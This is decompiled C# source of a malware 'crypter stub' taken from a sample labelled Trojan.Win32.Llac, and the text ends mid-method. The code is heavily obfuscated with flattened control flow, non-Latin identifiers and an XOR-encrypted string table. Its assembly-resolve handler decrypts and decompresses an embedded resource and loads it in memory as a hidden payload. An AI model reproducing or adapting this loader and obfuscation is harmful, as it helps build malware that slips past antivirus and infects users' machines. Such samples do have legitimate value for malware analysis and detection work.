// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴓ
// Assembly: Sk1dZ™ Crypter Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 765DE0A6-3ADE-4E57-B9F8-38E417A60863
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Llac.corb-c03a55dcfef9171c3c7a521e3f6aa3cd6873dbf8e0e0c6041a02f9ac6f9bd531.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Sk1dZ__Crypter_Stub.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;

namespace Ⴈ
{
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal sealed class Ⴓ
  {
    private static readonly char[] ႭႥ;
    private static readonly char[] ႭႭ;
    private static readonly string[] ႭႣ;
    internal static Ⴈ.Ⴓ.ႭႰ ႭႳ;
    private static bool ႣႨ;

    [EditorBrowsable(EditorBrowsableState.Never)]
    private Ⴓ()
    {
    }

    public static string Ⴍ(IEnumerable<XElement> Ⴄ)
    {
      IEnumerator<XElement> enumerator;
      string str;
      try
      {
        int num = 3;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 7:
              num = 1;
              continue;
            case 1:
              num = enumerator.MoveNext() ? 5 : 2;
              continue;
            case 2:
            case 4:
              goto label_14;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            default:
              enumerator = Ⴄ.GetEnumerator();
              num = 1;
              continue;
          }
        }
label_4:
        XElement current = enumerator.Current;
label_5:
        str = Ⴈ.Ⴓ.ႭႼ(current, 28, 78);
        goto label_17;
      }
      finally
      {
        int num = 2;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 1:
              goto label_13;
            case 3:
            case 4:
              num = 0;
              continue;
            case 5:
              enumerator.Dispose();
              goto case 3;
            default:
              num = enumerator == null ? 0 : 5;
              continue;
          }
        }
label_13:;
      }
label_14:
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
          case 4:
            goto label_17;
          default:
            str = (string) null;
            num1 = 0;
            continue;
        }
      }
label_17:
      return str;
    }

    public static void Ⴈ(IEnumerable<XElement> Ⴐ, string Ⴗ)
    {
      IEnumerator<XElement> enumerator;
      bool flag;
      try
      {
        int num = 9;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 6:
              flag = enumerator.MoveNext();
              num = flag ? 8 : 5;
              continue;
            case 2:
            case 7:
              num = 4;
              continue;
            case 3:
              num = 0;
              continue;
            case 4:
              num = 5;
              continue;
            case 5:
              goto label_16;
            case 8:
              MyComputer.Ⴗ(enumerator.Current, Ⴗ, 897, 1007);
              goto case 2;
            default:
              enumerator = Ⴐ.GetEnumerator();
              num = 0;
              continue;
          }
        }
      }
      finally
      {
        int num = 4;
        while (true)
        {
          switch (num)
          {
            case 0:
              enumerator.Dispose();
              goto case 5;
            case 2:
            case 3:
              goto label_15;
            case 5:
              num = 2;
              continue;
            case 6:
              num = !flag ? 2 : 0;
              continue;
            default:
              flag = enumerator != null;
              goto case 6;
          }
        }
label_15:;
      }
label_16:
      switch (2)
      {
      }
    }

    public static string Ⴓ(IEnumerable<XElement> Ⴐ, XName Ⴅ)
    {
      IEnumerator<XElement> enumerator;
      string str;
      bool flag;
      try
      {
        int num = 5;
        while (true)
        {
          switch (num)
          {
            case 1:
              num = 7;
              continue;
            case 2:
            case 7:
              flag = enumerator.MoveNext();
              num = flag ? 3 : 6;
              continue;
            case 3:
              goto label_4;
            case 4:
            case 6:
              goto label_14;
            default:
              enumerator = Ⴐ.GetEnumerator();
              num = 7;
              continue;
          }
        }
label_4:
        str = Ⴈ.Ⴗ.ႤႭ(Ⴈ.Ⴗ.ႤႣ(enumerator.Current, Ⴅ, 78, 12), 835, 798);
        goto label_17;
      }
      finally
      {
        int num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
              enumerator.Dispose();
              goto case 5;
            case 2:
              num = !flag ? 3 : 0;
              continue;
            case 3:
            case 4:
              goto label_13;
            case 5:
              num = 3;
              continue;
            default:
              flag = enumerator != null;
              goto case 2;
          }
        }
label_13:;
      }
label_14:
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
          case 3:
            goto label_17;
          default:
            str = (string) null;
            num1 = 1;
            continue;
        }
      }
label_17:
      return str;
    }

    public static void Ⴈ(IEnumerable<XElement> Ⴅ, XName Ⴗ, string Ⴄ)
    {
      IEnumerator<XElement> enumerator;
      bool flag;
      try
      {
        int num = 7;
        XElement current;
        while (true)
        {
          switch (num)
          {
            case 1:
              goto label_16;
            case 2:
              flag = enumerator.MoveNext();
              num = flag ? 8 : 1;
              continue;
            case 3:
              num = 9;
              continue;
            case 4:
              MyComputer.Ⴈ(current, Ⴗ, (object) Ⴄ, 333, 262);
              goto case 3;
            case 5:
            case 8:
              current = enumerator.Current;
              goto case 4;
            case 6:
              num = 2;
              continue;
            case 9:
              num = 1;
              continue;
            default:
              enumerator = Ⴅ.GetEnumerator();
              num = 2;
              continue;
          }
        }
      }
      finally
      {
        int num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
              enumerator.Dispose();
              num = 2;
              continue;
            case 2:
            case 4:
            case 5:
              goto label_15;
            case 6:
              num = !flag ? 2 : 0;
              continue;
            default:
              flag = enumerator != null;
              goto case 6;
          }
        }
label_15:;
      }
label_16:
      switch (2)
      {
      }
    }

    public static string Ⴍ(XElement Ⴐ, XName Ⴈ)
    {
label_3:
      string str = Ⴈ.Ⴗ.ႤႭ(Ⴈ.Ⴗ.ႤႣ(Ⴐ, Ⴈ, 156, 222), 440, 485);
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
          case 3:
          case 5:
            goto label_3;
          case 2:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴍ);
            num = 5;
            continue;
        }
      }
label_4:
      return str;
    }

    public static void Ⴗ(XElement Ⴐ, XName Ⴈ, string Ⴓ) => MyComputer.Ⴈ(Ⴐ, Ⴈ, (object) Ⴓ, 559, 612);

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static XAttribute Ⴃ(XName Ⴅ, object Ⴐ)
    {
label_3:
      int num = Ⴐ != null ? 2 : 4;
      XAttribute xattribute;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            xattribute = (XAttribute) null;
            num = 1;
            continue;
          case 1:
            goto label_6;
          case 2:
            xattribute = new XAttribute(Ⴅ, Ⴈ.Ⴗ.Ⴄ(Ⴐ, 702, 741));
            num = 1;
            continue;
          case 3:
          case 5:
          case 6:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴃ);
            num = 3;
            continue;
        }
      }
label_6:
      return xattribute;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static XAttribute Ⴐ(XName Ⴓ, XNamespace Ⴐ)
    {
label_3:
      XAttribute xattribute1 = new XAttribute(Ⴓ, (object) Ⴈ.Ⴗ.ႤႥ(Ⴐ, 657, 652));
      MyComputer.Ⴄ((XObject) xattribute1, (object) Ⴐ, 462, 451);
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_3;
          case 1:
          case 3:
            goto label_5;
          case 2:
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴐ);
            num = 0;
            continue;
        }
      }
label_4:
      XAttribute xattribute2 = xattribute1;
label_5:
      return xattribute2;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static object Ⴓ(string[] Ⴄ, XNamespace[] Ⴐ, List<XAttribute> Ⴗ, object Ⴓ)
    {
label_3:
      bool flag = Ⴓ != null;
      int num = !flag ? 4 : 7;
      XElement Ⴀ;
      object obj;
      IEnumerable Ⴄ1;
      while (true)
      {
        switch (num)
        {
          case 1:
            num = 6;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 11:
            Ⴄ1 = Ⴓ as IEnumerable;
            flag = Ⴄ1 != null;
            num = 14;
            continue;
          case 4:
          case 13:
            obj = Ⴓ;
            num = 10;
            continue;
          case 5:
            num = 6;
            continue;
          case 6:
            num = 4;
            continue;
          case 7:
            Ⴀ = Ⴓ as XElement;
            flag = Ⴀ != null;
            num = !flag ? 11 : 12;
            continue;
          case 8:
            obj = (object) Ⴈ.Ⴓ.Ⴗ(Ⴄ, Ⴐ, Ⴗ, Ⴄ1);
            goto case 9;
          case 9:
            num = 10;
            continue;
          case 10:
            goto label_14;
          case 12:
            obj = (object) Ⴈ.Ⴓ.Ⴄ(Ⴄ, Ⴐ, Ⴗ, Ⴀ);
            num = 10;
            continue;
          case 14:
            num = !flag ? 1 : 8;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴓ);
            num = 2;
            continue;
        }
      }
label_14:
      return obj;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static IEnumerable Ⴗ(
      string[] Ⴗ,
      XNamespace[] Ⴀ,
      List<XAttribute> Ⴓ,
      IEnumerable Ⴄ)
    {
label_3:
      bool flag = Ⴄ != null;
label_4:
      int num = !flag ? 10 : 11;
      IEnumerable<XElement> source;
      IEnumerable enumerable;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_3;
          case 1:
            num = 8;
            continue;
          case 2:
            enumerable = (IEnumerable) Ⴄ.Cast<object>().Select<object, object>(new Func<object, object>(new Ⴈ.Ⴓ.Ⴐ(Ⴗ, Ⴀ, Ⴓ).Ⴓ));
            goto case 3;
          case 3:
          case 7:
            num = 5;
            continue;
          case 4:
            enumerable = (IEnumerable) source.Select<XElement, XElement>(new Func<XElement, XElement>(new Ⴈ.Ⴓ.Ⴐ(Ⴗ, Ⴀ, Ⴓ).Ⴅ));
            num = 5;
            continue;
          case 5:
            goto label_12;
          case 8:
            num = 10;
            continue;
          case 9:
            goto label_4;
          case 10:
            enumerable = Ⴄ;
            num = 5;
            continue;
          case 11:
            source = Ⴄ as IEnumerable<XElement>;
            flag = source != null;
            num = !flag ? 2 : 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴗ);
            num = 0;
            continue;
        }
      }
label_12:
      return enumerable;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    public static XElement Ⴄ(string[] Ⴃ, XNamespace[] Ⴐ, List<XAttribute> Ⴍ, XElement Ⴀ)
    {
label_3:
      bool flag1 = Ⴀ != null;
      int num1 = !flag1 ? 20 : 12;
      while (true)
      {
        XAttribute xattribute1;
        XAttribute xattribute2;
        XNamespace xnamespace1;
        string str1;
        bool flag2;
        int num2;
        int index1;
        XNamespace xnamespace2;
        int num3;
        int index2;
        XAttribute xattribute3;
        string str2;
        XNamespace xnamespace3;
        int num4;
        switch (num1)
        {
          case 1:
          case 38:
            num1 = 36;
            continue;
          case 2:
            num1 = 6;
            continue;
          case 3:
            xattribute3 = Ⴍ[index2];
            str2 = Ⴈ.Ⴓ.Ⴍ.Ⴜ(Ⴈ.Ⴓ.Ⴍ.Ⴐ(xattribute3, 413, 465), 71, 0);
            num1 = 30;
            continue;
          case 4:
            xnamespace1 = xattribute1.Annotation<XNamespace>();
            str1 = Ⴈ.Ⴓ.Ⴍ.Ⴜ(Ⴈ.Ⴓ.Ⴍ.Ⴐ(xattribute1, 657, 733), 429, 490);
            num1 = 19;
            continue;
          case 5:
            xattribute1.Remove();
            Ⴍ.Add(xattribute1);
            num1 = 2;
            continue;
          case 6:
            num1 = 38;
            continue;
          case 7:
            checked { ++index2; }
            num1 = 39;
            continue;
          case 8:
            Ⴈ.Ⴓ.ႣႣ(xattribute1, 823, 866);
            num1 = 37;
            continue;
          case 9:
            goto label_3;
          case 10:
            xattribute2 = Ⴈ.Ⴓ.ႣႭ(xattribute1, 450, 437);
            flag1 = MyComputer.Ⴜ(xattribute1, 486, 510);
            num1 = 28;
            continue;
          case 11:
            num1 = !Ⴈ.Ⴓ.Ⴍ.ႤႨ(xnamespace1, xnamespace3, 816, 854) ? 37 : 8;
            continue;
          case 12:
            xattribute1 = Ⴈ.Ⴓ.ႣႥ(Ⴀ, 30, 124);
            num1 = 26;
            continue;
          case 13:
            num1 = Ⴐ != null ? 27 : 25;
            continue;
          case 14:
            xattribute1 = (XAttribute) null;
            num1 = 21;
            continue;
          case 15:
          case 27:
            num4 = 1;
            break;
          case 16:
            num2 = checked (Ⴃ.Length - 1);
            index1 = 0;
            num1 = 41;
            continue;
          case 17:
            num1 = xattribute1 == null ? 2 : 5;
            continue;
          case 18:
            flag1 = Ⴈ.Ⴈ.Ⴐ(str1, str2, 678, 741);
            num1 = !flag1 ? 35 : 11;
            continue;
          case 19:
          case 31:
            flag1 = (object) xnamespace1 != null;
            num1 = !flag1 ? 38 : 34;
            continue;
          case 20:
            goto label_41;
          case 21:
            flag2 = xattribute1 != null;
            num1 = !flag2 ? 6 : 32;
            continue;
          case 22:
            num3 = checked (Ⴍ.Count - 1);
            index2 = 0;
            num1 = 39;
            continue;
          case 23:
            string str3 = Ⴃ[index1];
            xnamespace2 = Ⴐ[index1];
            flag2 = Ⴈ.Ⴈ.Ⴐ(str1, str3, 700, 767);
            num1 = 33;
            continue;
          case 24:
            checked { ++index1; }
            num1 = 41;
            continue;
          case 25:
            num4 = 0;
            break;
          case 26:
            num1 = xattribute1 != null ? 10 : 20;
            continue;
          case 28:
            num1 = !flag1 ? 36 : 4;
            continue;
          case 29:
            flag1 = Ⴈ.Ⴓ.Ⴍ.ႤႨ(xnamespace1, xnamespace2, 409, 511);
            num1 = !flag1 ? 14 : 40;
            continue;
          case 30:
            xnamespace3 = xattribute3.Annotation<XNamespace>();
            flag2 = (object) xnamespace3 != null;
            num1 = !flag2 ? 7 : 18;
            continue;
          case 32:
            flag1 = Ⴍ != null;
            num1 = !flag1 ? 17 : 22;
            continue;
          case 33:
            num1 = !flag2 ? 24 : 29;
            continue;
          case 34:
            num1 = Ⴃ == null ? 25 : 13;
            continue;
          case 35:
            num1 = 7;
            continue;
          case 36:
            xattribute1 = xattribute2;
            num1 = 26;
            continue;
          case 37:
            xattribute1 = (XAttribute) null;
            num1 = 17;
            continue;
          case 39:
            num1 = index2 <= num3 ? 3 : 17;
            continue;
          case 40:
            Ⴈ.Ⴓ.ႣႣ(xattribute1, 477, 392);
            num1 = 14;
            continue;
          case 41:
            num1 = index1 <= num2 ? 23 : 21;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴄ);
            num1 = 9;
            continue;
        }
        flag2 = num4 != 0;
        num1 = !flag2 ? 21 : 16;
      }
label_41:
      return Ⴀ;
    }

    internal static Assembly ႰႥ(object sender, ResolveEventArgs args)
    {
label_3:
      int num1 = !Ⴈ.Ⴈ.Ⴃ(Ⴈ.Ⴗ.ႤႼ(args, 209, 137), MyComputer.ႥႭ(241, 240), 1008, 980) ? 15 : 0;
      string str1;
      string name;
      string str2;
      AppDomain appDomain;
      Dictionary<string, string> dictionary;
      Assembly assembly;
      Stream stream;
      byte[] buffer;
      int num2;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_4;
          case 1:
            num1 = index1 < buffer.Length ? 4 : 19;
            continue;
          case 2:
            if (dictionary == null)
            {
              num1 = 17;
              continue;
            }
            goto label_42;
          case 3:
            num1 = 2;
            continue;
          case 4:
            buffer[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
            num1 = 5;
            continue;
          case 5:
            ++index1;
            num1 = 1;
            continue;
          case 6:
          case 11:
          case 16:
            goto label_3;
          case 7:
            num1 = stream != null ? 12 : 18;
            continue;
          case 8:
            index1 = 0;
            num1 = 1;
            continue;
          case 9:
            appDomain = Ⴈ.Ⴓ.ႣႰ(764, 687);
            dictionary = (Dictionary<string, string>) Ⴈ.Ⴓ.ႣႳ(appDomain, str2, 469, 505);
            goto case 3;
          case 10:
            assembly = MyComputer.ႥႭ(73, 75);
            stream = Ⴈ.Ⴓ.ႣႤ(assembly, str1, 857, 831);
            num1 = 7;
            continue;
          case 12:
            buffer = new byte[Ⴈ.Ⴗ.ႷႤ(stream, 219, 180) - 1L];
            num1 = 13;
            continue;
          case 13:
            num2 = Ⴈ.Ⴈ.ႠႭ(stream, 459, 393);
            MyComputer.ႥႥ(stream, buffer, 0, buffer.Length, 425, 488);
            num1 = 8;
            continue;
          case 15:
            str1 = Ⴈ.Ⴓ.Ⴜ(1257221705, 6);
            name = str1;
            str2 = Ⴈ.Ⴈ.Ⴜ((object) name, (object) '1', 456, 470);
            num1 = 9;
            continue;
          case 17:
            dictionary = new Dictionary<string, string>();
            Ⴈ.Ⴗ.ႷႳ(appDomain, str2, (object) dictionary, 484, 415);
            num1 = 10;
            continue;
          case 18:
            goto label_13;
          case 19:
            goto label_20;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႰႥ);
            num1 = 16;
            continue;
        }
      }
label_4:
      return (Assembly) null;
label_13:
      return (Assembly) null;
label_20:
      MemoryStream memoryStream = new MemoryStream();
      DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
      try
      {
        int num3 = 2;
        byte[] numArray;
        int num4;
        while (true)
        {
          switch (num3)
          {
            case 0:
              num3 = 7;
              continue;
            case 1:
            case 5:
              goto label_32;
            case 4:
            case 6:
              Ⴈ.Ⴗ.ႷႷ((Stream) memoryStream, numArray, 0, num4, 20, 35);
              goto case 7;
            case 7:
              num3 = (num4 = MyComputer.ႥႥ((Stream) deflateStream, numArray, 0, numArray.Length, 860, 798)) > 0 ? 4 : 5;
              continue;
            default:
              numArray = new byte[1024];
              goto case 0;
          }
        }
      }
      finally
      {
        int num5 = 1;
        while (true)
        {
          switch (num5)
          {
            case 0:
            case 5:
              goto label_31;
            case 3:
            case 4:
            case 6:
              goto label_30;
            default:
              num5 = deflateStream == null ? 0 : 6;
              continue;
          }
        }
label_30:
        deflateStream.Dispose();
label_31:;
      }
label_32:
      int num6 = 11;
label_33:
      Assembly data;
      string[] manifestResourceNames;
      int index2;
      string key;
      while (true)
      {
        switch (num6)
        {
          case 0:
            goto label_44;
          case 1:
            key = manifestResourceNames[index2];
            goto case 8;
          case 2:
            num6 = index2 < manifestResourceNames.Length ? 1 : 6;
            continue;
          case 3:
            num6 = 2;
            continue;
          case 4:
            goto label_45;
          case 5:
            goto label_42;
          case 6:
            num6 = 7;
            continue;
          case 7:
            num6 = !dictionary.ContainsKey(args.Name) ? 4 : 0;
            continue;
          case 8:
            dictionary[key] = key;
            ++index2;
            num6 = 2;
            continue;
          case 9:
            appDomain.SetData(name, (object) data);
            goto case 12;
          case 12:
            manifestResourceNames = data.GetManifestResourceNames();
            index2 = 0;
            goto case 3;
          default:
            data = Assembly.Load(MyComputer.ႥႣ(memoryStream, 380, 288), (byte[]) null, assembly.Evidence);
            num6 = 9;
            continue;
        }
      }
label_44:
      return data;
label_45:
      return (Assembly) null;
label_42:
      data = (Assembly) appDomain.GetData(name);
      num6 = 7;
      goto label_33;
    }

    [SecuritySafeCritical]
    static Ⴓ()
    {
      int num = 6;
      char[] chArray;
      while (true)
      {
        switch (num)
        {
          case 0:
            chArray[1] = 'ඊ';
            chArray[0] = '˩';
            num = 3;
            continue;
          case 1:
          case 4:
            goto label_7;
          case 2:
            chArray[3] = '㵸';
            chArray[5] = 'ː';
            Ⴈ.Ⴓ.ႭႣ = new string[8];
            num = 1;
            continue;
          case 3:
            chArray[7] = 'ൡ';
            chArray[4] = '㦇';
            chArray[6] = '⟜';
            num = 2;
            continue;
          case 5:
            chArray[2] = '㈄';
            goto case 0;
          case 7:
            goto label_8;
          default:
            Ⴈ.Ⴓ.ႣႼ();
            Ⴈ.Ⴓ.ႭႭ = new char[210]
            {
              char.MinValue,
              '\u0005',
              char.MinValue,
              'ʯ',
              '\u0DE5',
              '㉶',
              '㴕',
              '㦶',
              '\u0001',
              '\u001A',
              char.MinValue,
              '්',
              '\u3257',
              '㴓',
              '㦶',
              'ʴ',
              '\u2786',
              'ⱃ',
              'ʤ',
              '෫',
              '㉠',
              '㴙',
              '㦪',
              'ʶ',
              '➽',
              'ഊ',
              'ʈ',
              'ඪ',
              '㉇',
              '㴊',
              '㧾',
              'ʠ',
              '➨',
              'എ',
              'ʛ',
              'ච',
              '㉄',
              '\u0002',
              '\u000E',
              char.MinValue,
              '㉷',
              '㴗',
              '㧩',
              'ʹ',
              '➤',
              'ഈ',
              'ʚ',
              '\u0DFE',
              '㉬',
              '㴝',
              '㧥',
              'ʵ',
              '➯',
              'ക',
              '\u0003',
              '\f',
              char.MinValue,
              '㴤',
              '㧄',
              'ʢ',
              '➥',
              '\u0D11',
              'ʝ',
              '෯',
              '㉠',
              '㵖',
              '㧢',
              'ʨ',
              '➹',
              '\u0004',
              '(',
              char.MinValue,
              '㦵',
              'ˢ',
              '➚',
              'ണ',
              'ʯ',
              '\u0DC8',
              '㉁',
              '㵉',
              '㦰',
              '˨',
              '➘',
              '\u0D53',
              '˞',
              '\u0DBC',
              '㈵',
              '㵊',
              '㦴',
              'ʒ',
              '⟪',
              '\u0D59',
              '˞',
              'ඹ',
              '㈲',
              '㴾',
              '㦱',
              'ˤ',
              '➙',
              '\u0D52',
              'ʬ',
              '\u0DB2',
              '㈶',
              '㴾',
              '㧂',
              '˧',
              '⟤',
              '\u0D52',
              'ʭ',
              'ම',
              '㉅',
              '㴹',
              '\u0005',
              '#',
              char.MinValue,
              'ʀ',
              '➮',
              'എ',
              'ʙ',
              '෯',
              '㉶',
              '㴌',
              '㧾',
              '˰',
              '➿',
              '\u0D00',
              'ʇ',
              'ඪ',
              '㉫',
              '㴖',
              '㧫',
              'ʩ',
              '⟼',
              'ഃ',
              'ʌ',
              'ඪ',
              '㉷',
              '㴝',
              '㧳',
              '˰',
              '➨',
              'എ',
              'ˉ',
              'හ',
              '㉫',
              '㴌',
              '㧯',
              'ʹ',
              '➲',
              'ആ',
              '\u0006',
              '\u001C',
              char.MinValue,
              '\u278B',
              'ഈ',
              'ʇ',
              '\u0DCC',
              '㉫',
              '㴊',
              '㧪',
              'ʣ',
              '\u2783',
              'ള',
              'ʌ',
              '෩',
              '㉱',
              '㴊',
              '㧴',
              'ʹ',
              '➪',
              '\u0D04',
              'ʯ',
              '\u0DE5',
              '㉶',
              '㴕',
              '㧄',
              'ʢ',
              '➹',
              '\u0D00',
              'ʝ',
              '෯',
              '\a',
              '\u001A',
              char.MinValue,
              'ശ',
              'ʀ',
              '\u0DE4',
              '㉂',
              '㴗',
              '㧵',
              'ʽ',
              '➯',
              'ാ',
              'ʺ',
              '෯',
              '㉡',
              '㴱',
              '㧩',
              'ʾ',
              '➹',
              'ഓ',
              'ʬ',
              'ෲ',
              '㉧',
              '㴝',
              '㧷',
              'ʤ',
              '➵',
              'എ',
              'ʇ'
            };
            chArray = new char[8];
            num = 5;
            continue;
        }
      }
label_8:
      return;
label_7:
      Ⴈ.Ⴓ.ႭႥ = chArray;
    }

    [SecuritySafeCritical]
    internal static SettingsBase Ⴅ([In] SettingsBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 100:
          num1 = 4;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
          case 4:
          case 6:
            goto label_8;
          case 3:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          case 7:
            num2 = 5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴅ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return SettingsBase.Synchronized(obj0);
    }

    [SecuritySafeCritical]
    internal static void Ⴀ(
      [In] WindowsFormsApplicationBase obj0,
      [In] ShutdownEventHandler obj1,
      [In] int obj2,
      [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_7;
          case 2:
            goto label_8;
          case 4:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 35:
                num2 = 3;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Shutdown += obj1;
    }

    internal static string Ⴜ([In] int obj0, [In] int obj1)
    {
label_3:
      int index1 = obj0 ^ 1257221642 ^ obj1;
      char[] ⴍⴍ = Ⴈ.Ⴓ.ႭႭ;
      int index2 = (int) ⴍⴍ[index1];
      int num1 = 3;
      string str;
      int length1;
      char[] chArray;
      char[] ⴍⴅ;
      int length2;
      int index3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 6:
            goto label_3;
          case 1:
            chArray = new char[length1];
            ⴍⴅ = Ⴈ.Ⴓ.ႭႥ;
            length2 = ⴍⴅ.Length;
            index1 += 3;
            num1 = 13;
            continue;
          case 2:
          case 7:
            num1 = index3 < length1 ? 12 : 10;
            continue;
          case 3:
            num1 = (str = Ⴈ.Ⴓ.ႭႣ[index2]) == null ? 4 : 5;
            continue;
          case 4:
            int num2 = (int) ⴍⴍ[index1 + 1];
            length1 = ((int) ⴍⴍ[index1 + 2] << 16) + num2;
            num1 = 1;
            continue;
          case 5:
            goto label_5;
          case 8:
            index3 = 1 + index3;
            num1 = 7;
            continue;
          case 10:
            goto label_12;
          case 11:
            goto label_13;
          case 12:
            chArray[index3] = (char) ((uint) ⴍⴍ[index1 + index3] ^ (uint) ⴍⴅ[(index3 + index2) % length2]);
            num1 = 8;
            continue;
          case 13:
            index3 = 0;
            num1 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴜ);
            num1 = 6;
            continue;
        }
      }
label_5:
      return str;
label_12:
      str = new string(chArray);
label_13:
      Ⴈ.Ⴓ.ႭႣ[index2] = str;
      return str;
    }

    [SecuritySafeCritical]
    internal static void ႭႤ([In] int obj0, [In] ref string obj1, [In] long obj2, [In] bool obj3, [In] int obj4, [In] int obj5)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
            num1 = 0;
            continue;
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj5 ^ obj4)
            {
              case 3:
                num2 = 5;
                break;
              default:
                num2 = 1;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      FileSystem.FileGet(obj0, ref obj1, obj2, obj3);
    }

    [SecuritySafeCritical]
    internal static int ႭႷ([In] ref int obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 35:
          num1 = 0;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_8;
          case 3:
          case 4:
            num2 = 7;
            continue;
          case 5:
          case 6:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႭႷ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Interlocked.Increment(ref obj0);
    }

    [SecuritySafeCritical]
    internal static int ႭႠ([In] int obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 74:
          num1 = 2;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 1;
            continue;
          case 1:
          case 3:
          case 6:
            goto label_3;
          case 2:
            goto label_8;
          case 4:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႭႠ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return Math.Max(obj0, obj1);
    }

    [SecuritySafeCritical]
    internal static string ႭႼ([In] XElement obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 82:
          num1 = 0;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 5:
            goto label_8;
          case 2:
            goto label_3;
          case 3:
            num2 = 2;
            continue;
          case 6:
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႭႼ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.Value;
    }

    [SecuritySafeCritical]
    internal static XAttribute ႣႥ([In] XElement obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 98:
          num1 = 6;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 4;
            continue;
          case 1:
            num2 = 4;
            continue;
          case 2:
          case 6:
            goto label_8;
          case 4:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.ႣႥ);
            num2 = 4;
            continue;
        }
